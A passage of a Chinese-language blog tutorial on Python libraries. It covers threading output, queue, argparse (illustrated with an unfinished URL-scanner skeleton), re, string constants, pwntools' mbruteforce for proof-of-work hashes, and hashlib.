class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">TestThread test  0</span><br><span class="line">MainThread main  0</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  1</span><br><span class="line">MainThread main  1</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  2</span><br><span class="line">MainThread main  2</span><br><span class="line">TestThread is alive  True</span><br><span class="line">MainThread main  3</span><br><span class="line">TestThread is alive  True</span><br><span class="line">TestThread test  3</span><br><span class="line">MainThread main  4</span><br><span class="line">TestThread test  4</span><br><span class="line">TestThread is alive  True</span><br><span class="line">123456789101112131415</span><br></pre></td></tr></table></figure><h4 id="5-相关问题"><a href="#5-相关问题" class="headerlink" title="5.相关问题"></a>5.相关问题</h4><blockquote><ol><li>run()和start()的区别是什么？</li><li>如何继承构造线程？</li></ol></blockquote><h4 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h4><ol><li><a href="https://blog.csdn.net/briblue/article/details/85101144" target="_blank" rel="noopener">Python多线程编程(一）：threading 模块 Thread 类的用法详解</a></li><li><a href="https://blog.csdn.net/weixin_40481076/article/details/101594705" target="_blank" rel="noopener">python多线程详解（超详细）</a></li></ol><h3 id="0x03-queue-库"><a href="#0x03-queue-库" class="headerlink" title="0x03 queue 库"></a><font color="navy">0x03 queue 库</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br></pre></td></tr></table></figure><h4 id="1-queue的常用方法"><a href="#1-queue的常用方法" class="headerlink" title="1.queue的常用方法"></a>1.queue的常用方法</h4><p>①  <code>q.put(item, block=True, timeout=None)</code></p><ul><li>item：放入队列中的数据元素。 </li><li>block：当队列中元素个数达到上限继续往里放数据时：如果 block=False，直接引发 queue.Full 异常；如果 block=True，且 timeout=None，则一直等待直到有数据出队列后可以放入数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有位置放入数据就引发 queue.Full 异常。 </li><li>timeout：设置超时时间。 </li></ul><p>② <code>q.put_nowait(item)</code> </p><blockquote><p>相当于 Queue.put(item, block=False)，当队列中元素个数达到上限继续往里放数据时直接引发 queue.Full 异常。</p></blockquote><p>③ <code>q.get(block=True, timeout=None)</code></p><blockquote><p>从队列中取出数据并返回该数据内容。</p></blockquote><ul><li>block：当队列中没有数据元素继续取数据时：如果 block=False，直接引发 queue.Empty 异常；如果 block=True，且 timeout=None，则一直等待直到有数据入队列后可以取出数据；如果 block=True，且 timeout=N，N 为某一正整数时，则等待 N 秒，如果队列中还没有数据放入的话就引发 queue.Empty 异常。</li><li>timeout：设置超时时间。</li></ul><p>④ <code>q.get_nowait()</code></p><blockquote><p>相当于 Queue.get(block=False)block，当队列中没有数据元素继续取数据时直接引发 queue.Empty 异常。</p></blockquote><p>⑤ <code>q.qsize()</code></p><blockquote><p>返回队列中数据元素的个数。</p></blockquote><p>⑥ <code>q..empty()</code></p><blockquote><p>如果队列为空，返回 True，否则返回 False。</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">q = queue.Queue()</span><br><span class="line">print(q.empty())  <span class="comment"># 对列为空，返回 True</span></span><br><span class="line">q.put(<span class="string">'python-100'</span>)  <span class="comment"># 在队列中插入元素 'python-100'</span></span><br><span class="line">print(q.empty())  <span class="comment"># 对列不为空，返回 False</span></span><br></pre></td></tr></table></figure></blockquote><p>⑦ <code>q.full()</code></p><blockquote><p>如果队列中元素个数达到上限，返回 True，否则返回 False。</p></blockquote><h4 id="2-queue的异常"><a href="#2-queue的异常" class="headerlink" title="2.queue的异常"></a>2.queue的异常</h4><p>① <code>queue.Full 异常</code></p><blockquote><p>当队列数据元素容量达到上限时，继续往队列中放入数据会引发 queue.Empty 异常，主要是不正当使用 put() 和 put_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    q.put(<span class="string">'stay hungry, stay foolish'</span>, block=<span class="keyword">False</span>)  <span class="comment"># 队列已满，继续往队列中放入数据，引发 queue.Full 异常</span></span><br><span class="line"><span class="keyword">except</span> queue.Full:</span><br><span class="line">    print(<span class="string">'queue.Full'</span>)</span><br></pre></td></tr></table></figure><p>② <code>queue.Empty 异常</code></p><blockquote><p>当队列中没有数据元素时，取出队列中的数据会引发 queue.Empty 异常，主要是不正当使用 get() 和 get_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):  <span class="comment"># 从队列中取数据，取出次数为4次，引发 queue.Empty 异常</span></span><br><span class="line">        print(q.get(block=<span class="keyword">False</span>))</span><br><span class="line"><span class="keyword">except</span> queue.Empty:</span><br><span class="line">    print(<span class="string">'queue.Empty'</span>)</span><br></pre></td></tr></table></figure><h3 id="0x04-argparse-库"><a href="#0x04-argparse-库" class="headerlink" title="0x04 argparse 库"></a>0x04 argparse 库</h3><blockquote><p><a href="https://docs.python.org/zh-cn/3/library/argparse.html" target="_blank" rel="noopener">官方文档</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Scan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url, inputDict, output, threadNum)</span>:</span></span><br><span class="line">        self.url = url <span class="keyword">if</span> url.find(<span class="string">"://"</span>) != <span class="number">-1</span> <span class="keyword">else</span> <span class="string">"http://"</span>+url</span><br><span class="line">        self.inputDict = inputDict</span><br><span class="line">        self.oFileName = output+<span class="string">".txt"</span> </span><br><span class="line">        self.threadNum = threadNum</span><br><span class="line">        self.lock = threading.RLock()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"url"</span>,   help = <span class="string">"the url you want to scan"</span>, type=str)</span><br><span class="line">    parser.add_argument(<span class="string">"-t"</span>, <span class="string">"--threadNum"</span>, dest=<span class="string">"threadNum"</span>, help = <span class="string">"The number of thread you scanning."</span>, type = int, default = <span class="number">60</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, dest=<span class="string">"inputDict"</span>, help = <span class="string">"The input about dictionary"</span>, type=str,default = <span class="string">"dict1.txt"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>,dest=<span class="string">"output"</span>, help=<span class="string">"the file of output"</span>, type=str, default=<span class="string">"result"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    scan = Scan(args.url, args.inputDict, args.output, args.threadNum)</span><br><span class="line">……</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的不健全的代码可以看出argparse的用途，下面进行总结，首先创建一个解析器：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; parser = argparse.ArgumentParser(description = <span class="string">"This is a test"</span>)</span><br></pre></td></tr></table></figure><h4 id="1-argparse-常用的方法"><a href="#1-argparse-常用的方法" class="headerlink" title="1.argparse 常用的方法"></a>1.argparse 常用的方法</h4><p>① <code>parser.add_argument()</code>：添加参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.add_argument(<span class="string">'integers'</span>, metavar=<span class="string">'N'</span>, type=int, nargs=<span class="string">'+'</span>, help=<span class="string">'an integer for the accumulator'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.add_argument(<span class="string">'--sum'</span>, dest=<span class="string">'accumulate'</span>, action=<span class="string">'store_const'</span>, const=sum, default=max, help=<span class="string">'sum the integers (default: find the max)'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>定义单个的命令行参数应当如何解析。每个形参都在下面有它自己更多的描述，长话短说有：</p></blockquote><ul><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#name-or-flags" target="_blank" rel="noopener">name or flags</a> - 一个命名或者一个选项字符串的列表，例如 <code>foo</code> 或 <code>-f, --foo</code>。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#action" target="_blank" rel="noopener">action</a> - 当参数在命令行中出现时使用的动作基本类型。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> - 命令行参数应当消耗的数目。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#const" target="_blank" rel="noopener">const</a> - 被一些 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#action" target="_blank" rel="noopener">action</a> 和 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#nargs" target="_blank" rel="noopener">nargs</a> 选择所需求的常数。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#default" target="_blank" rel="noopener">default</a> - 当参数未在命令行中出现时使用的值。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#type" target="_blank" rel="noopener">type</a> - 命令行参数应当被转换成的类型。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#choices" target="_blank" rel="noopener">choices</a> - 可用的参数的容器。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#required" target="_blank" rel="noopener">required</a> - 此命令行选项是否可省略 （仅选项可用）。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#help" target="_blank" rel="noopener">help</a> - 一个此选项作用的简单描述。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#metavar" target="_blank" rel="noopener">metavar</a> - 在使用方法消息中使用的参数值示例。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#dest" target="_blank" rel="noopener">dest</a> - 被添加到 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.parse_args" target="_blank" rel="noopener"><code>parse_args()</code></a> 所返回对象上的属性名。</li></ul><p>② <code>args = parser.parse_args()</code>：解析参数</p><blockquote><p>将参数字符串转换为对象并将其设为命名空间的属性。 返回带有成员的命名空间。之前对 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener"><code>add_argument()</code></a> 的调用决定了哪些对象被创建以及它们如何被赋值。 请参阅 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.ArgumentParser.add_argument" target="_blank" rel="noopener"><code>add_argument()</code></a> 的文档了解详情。</p></blockquote><ul><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#args" target="_blank" rel="noopener">args</a> - 要解析的字符串列表。 默认值是从 <a href="https://docs.python.org/zh-cn/3/library/sys.html#sys.argv" target="_blank" rel="noopener"><code>sys.argv</code></a> 获取。</li><li><a href="https://docs.python.org/zh-cn/3/library/argparse.html#namespace" target="_blank" rel="noopener">namespace</a> - 用于获取属性的对象。 默认值是一个新的空 <a href="https://docs.python.org/zh-cn/3/library/argparse.html#argparse.Namespace" target="_blank" rel="noopener"><code>Namespace</code></a> 对象。</li></ul><h3 id="0x05-re-库（正则表达式）"><a href="#0x05-re-库（正则表达式）" class="headerlink" title="0x05 re 库（正则表达式）"></a>0x05 re 库（正则表达式）</h3><h4 id="1-核心笔记"><a href="#1-核心笔记" class="headerlink" title="1.核心笔记"></a>1.核心笔记</h4><blockquote><p>在讨论正则表达式时，会用术语“匹配”（matching），指的是术语“模式匹配”（pattern-matching）。在Python专门术语中，有两种方法完成模式匹配：搜索（searching）和匹配（matching）。</p></blockquote><ul><li>搜索，即在字符串任一部分中搜索匹配的模式，是通过search()函数或方法来实现</li><li>匹配，指的是判断一个字符串能否从起始处全部或部分的匹配某个模式，时调用match()函数或方法实现的</li></ul><h4 id="2-正则表达式中常见的符号和字符"><a href="#2-正则表达式中常见的符号和字符" class="headerlink" title="2.正则表达式中常见的符号和字符"></a>2.正则表达式中常见的符号和字符</h4><p>如右图</p><h4 id="3-常用的函数和方法"><a href="#3-常用的函数和方法" class="headerlink" title="3.常用的函数和方法"></a>3.常用的函数和方法</h4><div class="table-container"><table><thead><tr><th>函数/方法</th><th>描述</th></tr></thead><tbody><tr><td><strong>模块的函数</strong></td><td></td></tr><tr><td>compile(pattern, flags=0)</td><td>对正则表达式模式pattern进行编译，flags是可选标志，并返回一个regex对象</td></tr><tr><td><strong>re模块的函数和regex对象的方法</strong></td><td></td></tr><tr><td>match(pattern, , string, flags=0)</td><td>尝试用正则表达式模式 pattern 匹配字符串 string，flags是可选标识符，<br>如果匹配成功，则返回一个匹配对象；否则返回None</td></tr><tr><td>search(pattern ,string, flags=0)</td><td>在字符串 string 中搜索正则表达式模式 pattern 的第一次出现，flags是可选标识符<br>如果匹配成功，则返回一个匹配对象；否则返回None</td></tr><tr><td>findall(pattern, string[, flag])</td><td>在字符串 string 中搜索正则表达式模式 pattern 的所有（非重复）出现；<br>返回一个匹配对象的列表</td></tr><tr><td><strong>匹配对象的方法</strong></td><td></td></tr><tr><td>group(num=0)</td><td>返回全部匹配对象（或指定编号是 num 的子组）</td></tr><tr><td>groups()</td><td>返回一个包含全部匹配的子组的元组，没有匹配成功，则返回一个空的元组</td></tr></tbody></table></div><h4 id="4-compile-相关知识点"><a href="#4-compile-相关知识点" class="headerlink" title="4.compile()相关知识点"></a>4.compile()相关知识点</h4><blockquote><p>在模式匹配之前，正则表达式模式必须现被编译成regex对象，由于正则表达式在执行过程中被多次用于比较，强烈建议先对它进行预编译，而且既然正则表达式的编译是必须的，那是用预先编译来提升性能无疑是明智之举，re.compile()就是提供此功能（给match、search和findall提供regex对象）</p></blockquote><h4 id="5-match、search和findall的区别"><a href="#5-match、search和findall的区别" class="headerlink" title="5.match、search和findall的区别"></a>5.match、search和findall的区别</h4><blockquote><ul><li>搜索，即在字符串任一部分中搜索匹配的模式，是通过search()函数或方法来实现</li><li>匹配，指的是判断一个字符串能否从起始处全部或部分的匹配某个模式，时调用match()函数或方法实现的</li><li>findall，与上面两个不同之处是：findall总是返回一个列表，如果findall如果没有找到匹配的部分，会返回空列表；如果成功找到匹配的部分，则返回所有匹配部分的列表</li></ul></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; m = <span class="string">"Hello Wang; Hello LI"</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.match(<span class="string">"Hello"</span>,m)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; &lt;re.Match object; span=(0, 5), match=<span class="string">'Hello'</span>&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.search(<span class="string">"Hello"</span>,m)</span></span><br><span class="line">&lt;re.Match object; span=(0, 5), match='Hello'&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.findall(<span class="string">"Hello"</span>,m)</span></span><br><span class="line">['Hello', 'Hello']</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.match(<span class="string">"LI"</span>,m)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="built_in">type</span>(re.match(<span class="string">"LI"</span>,m))</span></span><br><span class="line">&lt;class 'NoneType'&gt;</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; re.search(<span class="string">"LI"</span>,m)</span></span><br><span class="line">&lt;re.Match object; span=(18, 20), match='LI'&gt;</span><br></pre></td></tr></table></figure><h3 id="0x06-string-模块（字符串）"><a href="#0x06-string-模块（字符串）" class="headerlink" title="0x06 string 模块（字符串）"></a>0x06 string 模块（字符串）</h3><h4 id="1-字符串常量"><a href="#1-字符串常量" class="headerlink" title="1.字符串常量"></a>1.字符串常量</h4><p><code>string.ascii_letters</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_letters</span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></table></figure><blockquote><p>大小写字母的总和，该值不依赖于语言区域。</p></blockquote><p><code>string.ascii_lowercase</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_lowercase</span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br></pre></td></tr></table></figure><blockquote><p>小写字母 <code>&#39;abcdefghijklmnopqrstuvwxyz&#39;</code>。 该值不依赖于语言区域，不会发生改变。</p></blockquote><p><code>string_ascii_uppercase</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_uppercase</span><br><span class="line"><span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br></pre></td></tr></table></figure><blockquote><p>大写字母 <code>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</code>。 该值不依赖于语言区域，不会发生改变。</p></blockquote><p><code>string.digits</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.digits</span><br><span class="line"><span class="string">'0123456789'</span></span><br></pre></td></tr></table></figure><blockquote><p>字符串 <code>&#39;0123456789&#39;</code>。</p></blockquote><p><code>string.hexdigits</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.hexdigits</span><br><span class="line"><span class="string">'0123456789abcdefABCDEF'</span></span><br></pre></td></tr></table></figure><blockquote><p>字符串 <code>&#39;0123456789abcdefABCDEF&#39;</code></p></blockquote><p><code>string.octdigits</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.octdigits</span><br><span class="line"><span class="string">'01234567'</span></span><br></pre></td></tr></table></figure><p><code>string.punctuation</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.punctuation</span><br><span class="line"><span class="string">'!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span></span><br></pre></td></tr></table></figure><blockquote><p>由在 <code>C</code> 区域设置中被视为标点符号的 ASCII 字符所组成的字符串: <code>!&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_</code>{|}~`.</p></blockquote><p><code>string.printable</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.printable</span><br><span class="line"><span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span></span><br></pre></td></tr></table></figure><blockquote><p>由被视为可打印符号的 ASCII 字符组成的字符串。 这是 <a href="https://docs.python.org/zh-cn/3/library/string.html#string.digits" target="_blank" rel="noopener"><code>digits</code></a>, <a href="https://docs.python.org/zh-cn/3/library/string.html#string.ascii_letters" target="_blank" rel="noopener"><code>ascii_letters</code></a>, <a href="https://docs.python.org/zh-cn/3/library/string.html#string.punctuation" target="_blank" rel="noopener"><code>punctuation</code></a> 和 <a href="https://docs.python.org/zh-cn/3/library/string.html#string.whitespace" target="_blank" rel="noopener"><code>whitespace</code></a> 的总和。</p></blockquote><p><code>string.whitespace</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.whitespace</span><br><span class="line"><span class="string">' \t\n\r\x0b\x0c'</span></span><br></pre></td></tr></table></figure><h4 id="2-常用方法"><a href="#2-常用方法" class="headerlink" title="2.常用方法"></a>2.常用方法</h4><p><img src="/images/148-1.png" alt></p><h3 id="0x06-pwntools-库"><a href="#0x06-pwntools-库" class="headerlink" title="0x06 pwntools 库"></a>0x06 pwntools 库</h3><h4 id="1-pwnlib-util-iters"><a href="#1-pwnlib-util-iters" class="headerlink" title="1.pwnlib.util.iters"></a>1.pwnlib.util.iters</h4><p><code>pwnlib.util.iters.mbruteforce(func, alphabet, length, method = &#39;upto&#39;, start = None)</code></p><blockquote><p><code>作用</code>：（多线程）成功暴力破解func函数，并且返回true。func 的输入应该是字符串，返回一个bool类型值。func将使用alphabet中的字符串进行调用，直到返回True或搜索空间已用尽。 参数start可以用于分割搜索空间，如果有多个CPU内核可用，这将很有用。</p><p><code>参数</code>：</p><ul><li><strong>func</strong>：暴力破解的函数</li><li><strong>alphabet</strong>：从中绘制符号的字母。</li><li><strong>length</strong>：最长的字符串尝试</li><li><strong>method</strong>：如果是 “<strong>upto</strong>” 尝试使用长度为1… length的字符串，如果是 “<strong>fixed</strong>” 仅尝试使用长度为length的字符串，如果是 “ <strong>downfrom</strong>” 尝试使用长度为length … 1的字符串</li><li><strong>start</strong>：一个元组（i，N），它将搜索空间分成N个片段，并从第i个片段（1..N）开始。None 等于（1，1）</li></ul><p><code>导入</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p><code>例子</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="0x07-hashlib-库"><a href="#0x07-hashlib-库" class="headerlink" title="0x07 hashlib 库"></a>0x07 hashlib 库</h3><h4 id="1-常用的摘要函数"><a href="#1-常用的摘要函数" class="headerlink" title="1.常用的摘要函数"></a>1.常用的摘要函数</h4><blockquote><p>这个模块针对不同的安全哈希和消息摘要算法实现了一个通用的接口。包括 FIPS 的 <code>SHA1</code>, <code>SHA224</code>, <code>SHA256</code>, <code>SHA384</code>, and <code>SHA512</code> (定义于 FIPS 180-2) 算法，以及 RSA 的 <code>MD5</code> 算法( 定义于 Internet <a href="https://tools.ietf.org/html/rfc1321.html" target="_blank" rel="noopener"><strong>RFC 1321</strong></a>)。术语“安全哈希”和“消息摘要”是可互换的，较旧的算法被称为消息摘要，现代术语是安全哈希。</p></blockquote><h4 id="2-常用的方法"><a href="#2-常用的方法" class="headerlink" title="2.常用的方法"></a>2.常用的方法</h4><p><code>hash.update(data)</code></p><blockquote><p>用 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-bytes-like-object" target="_blank" rel="noopener">bytes-like object</a> 来更新哈希对象。 重复调用相当于单次调用并传入所有参数的拼接结果: <code>m.update(a); m.update(b)</code> 等价于 <code>m.update(a+b)</code>。</p></blockquote><p><code>hash.digest()</code></p><blockquote><p>返回当前已传给 update() 方法的数据摘要。 这是一个大小为 digest_size 的字节串对象，字节串中可包含 0 至 255 的完整取值范围。</p></blockquote><p><code>hash.hexdigest()</code></p><blockquote><p>类似于 digest() 但摘要会以两倍长度字符串对象的形式返回，其中仅包含十六进制数码。 这可以被用于在电子邮件或其他非二进制环境中安全地交换数据值。</p></blockquote><p><code>hash.copy()</code></p><blockquote><p>返回哈希对象的副本（“克隆”）。 这可被用来高效地计算共享相同初始子串的数据的摘要。</p></blockquote><h4 id="3-两种表示方法"><a href="#3-两种表示方法" class="headerlink" title="3.两种表示方法"></a>3.两种表示方法</h4><p><code>第一种</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = hashlib.sha256()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.update(<span class="string">b"HackerLee"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.digest()</span><br><span class="line"><span class="string">b'\xd1\xb8N\xa4\'\xa5vl\x81W\x1f\xb0E\x90\xe4\xe2\xf0;\xb4\x95\xa1\x92ol%\xbb-\x91\xd5I"$'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.hexdigest()</span><br><span class="line"><span class="string">'d1b84ea427a5766c81571fb04590e4e2f03bb495a1926f6c25bb2d91d5492224'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.digest_size</span><br><span class="line"><span class="number">32</span></span><br></pre></td></tr></table></figure><p><code>第二种</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 